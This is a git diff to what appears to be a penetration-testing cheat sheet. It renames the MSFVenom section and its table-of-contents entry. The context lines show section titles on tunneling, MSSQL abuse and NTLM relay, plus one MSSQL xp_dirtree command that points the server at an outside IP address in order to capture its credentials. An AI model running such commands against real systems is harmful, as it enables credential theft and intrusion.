@@ -16,7 +16,7 @@
 - [10. MSSQL Useful Queries](#MSSQL-Useful-Queries)
 - [11. MSSQLPwner](#MSSQLPwner)
 - [12. NTLM Relay](#NTLM-Relay)
-- [13. MSFVenom Cheetsheet](#MSFVenom-Cheetsheet)
+- [13. MSFVenom-Payload-Generation](#MSFVenom-Payload-Generation)
 
 
 # Tunneling - Ligolo-NG
@@ -275,7 +275,7 @@ impacket:
 
 - `xp_dirtree \\192.168.45.196\blabla`
 
-# MSFVenom Cheetsheet
+# MSFVenom Payload Generation
 
 | Name                            | Payload                                                                                                                                                                                                                        |     |     |
 | ------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --- | --- |
